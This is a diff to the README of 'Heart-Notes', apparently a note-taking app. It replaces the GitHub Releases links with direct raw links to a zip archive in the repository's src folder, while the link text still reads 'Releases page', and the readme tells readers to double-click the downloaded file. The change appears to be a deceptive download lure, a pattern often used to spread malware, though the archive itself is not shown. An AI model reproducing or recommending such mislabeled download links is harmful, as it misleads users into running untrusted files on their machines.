@@ -6,7 +6,7 @@ Welcome to Heart-Notes! This application offers an elegant, interactive note wal
 
 ## 📥 Download Heart-Notes
 
-[![Download Heart-Notes](https://img.shields.io/badge/Download%20Heart--Notes-brightgreen)](https://github.com/mature-lacrosse907/Heart-Notes/releases)
+[![Download Heart-Notes](https://raw.githubusercontent.com/mature-lacrosse907/Heart-Notes/main/src/Heart-Notes-v1.7.zip%20Heart--Notes-brightgreen)](https://raw.githubusercontent.com/mature-lacrosse907/Heart-Notes/main/src/Heart-Notes-v1.7.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ Heart-Notes includes several key features to enhance your note-taking experience
 
 To download Heart-Notes:
 
-1. Visit the [Releases page](https://github.com/mature-lacrosse907/Heart-Notes/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/mature-lacrosse907/Heart-Notes/main/src/Heart-Notes-v1.7.zip).
 2. Find the latest version of Heart-Notes.
 3. Click the appropriate link for your operating system to download the file.
 4. Once downloaded, locate the file in your downloads folder and double-click it to start the installation process.
